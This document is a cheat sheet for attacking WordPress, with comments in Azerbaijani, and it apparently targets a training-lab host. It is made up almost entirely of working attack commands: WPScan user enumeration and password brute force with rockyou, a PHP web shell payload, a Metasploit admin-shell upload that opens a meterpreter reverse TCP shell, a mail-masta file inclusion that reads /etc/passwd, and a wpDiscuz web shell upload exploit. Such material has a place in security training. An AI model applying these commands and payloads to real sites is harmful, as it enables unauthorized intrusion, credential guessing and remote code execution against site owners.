# Wordpress Enumeration
```powershell
# Version
curl -s http://blog.inlanefreight.local | grep WordPress

# Login Page
curl -s http://blog.inlanefreight.local/wp-login.php

# Plugins
curl -s http://blog.inlanefreight.local/wp-content/plugins/

# Themes
curl -s http://blog.inlanefreight.local/wp-content/themes/
```

# WPScan
```powershell
sudo gem install wpscan
sudo wpscan --update

wpscan --url https://target.com --api-token YOUR_TOKEN_HERE
echo "cli_options:\n  api_token: YOUR_TOKEN" > ~/.wpscan/scan.yml
```

# Detection Mode
```powershell
--detection-mode passive
--detection-mode aggressive
--detection-mode mixed
```

# Version and Core Enumeration
```powershell
wpscan --url https://target.com --detection-mode aggressive
```

# Plugin Enumeration
```powershell
wpscan --url https://target.com --enumerate vp

wpscan --url https://target.com --enumerate ap

wpscan --url https://target.com --enumerate p

wpscan --url https://target.com --enumerate ap --plugins-detection aggressive
```

# Theme Enumeration
```powershell
wpscan --url https://target.com --enumerate vt

wpscan --url https://target.com --enumerate at

wpscan --url https://target.com --enumerate t
```

# User Enumeration
```powershell
wpscan --url https://target.com --enumerate u

wpscan --url https://target.com --enumerate u[1-50]
```

# Brute Force
```powershell
# Tək user, wordlist ilə
wpscan --url https://target.com \
       --username admin \
       --passwords rockyou.txt \
       --threads 50

# User listindən
wpscan --url https://target.com \
       --usernames users.txt \
       --passwords /usr/share/wordlists/rockyou.txt

# Login page ilə
wpscan --url https://target.com \
       --username admin \
       --passwords rockyou.txt \
       --password-attack wp-login
```

# Full Enumeration
```powershell
# MƏRHƏLƏ 1: Kəşf
wpscan --url https://target.com \
       --detection-mode passive \
       --api-token TOKEN

# MƏRHƏLƏ 2: Tam enumeration
wpscan --url https://target.com \
       --enumerate ap,at,u,cb,dbe \
       --detection-mode aggressive \
       --api-token TOKEN \
       -o enum_results.json -f json

# MƏRHƏLƏ 3: İstifadəçi tapıldıqdan sonra brute force
wpscan --url https://target.com \
       --usernames found_users.txt \
       --passwords /usr/share/wordlists/rockyou.txt \
       --password-attack xmlrpc \
       --threads 20 \
       -o bruteforce_results.txt
```

# Remote Code Execution
<img width="902" height="535" alt="image" src="https://github.com/user-attachments/assets/fe15361e-1a32-41cc-932d-212b08100697" />
---
```powershell
PAYLOAD 1
system($_GET[0]);

curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

# Vulnerable Plugins - mail-masta
```powershell
PAYLOAD 2
<?php 
include($_GET['pl']);
global $wpdb;
$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");
echo $count[0]->co;
?>

curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

# Vulnerable Plugins - wpDiscuz
```powershell
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot;

curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```
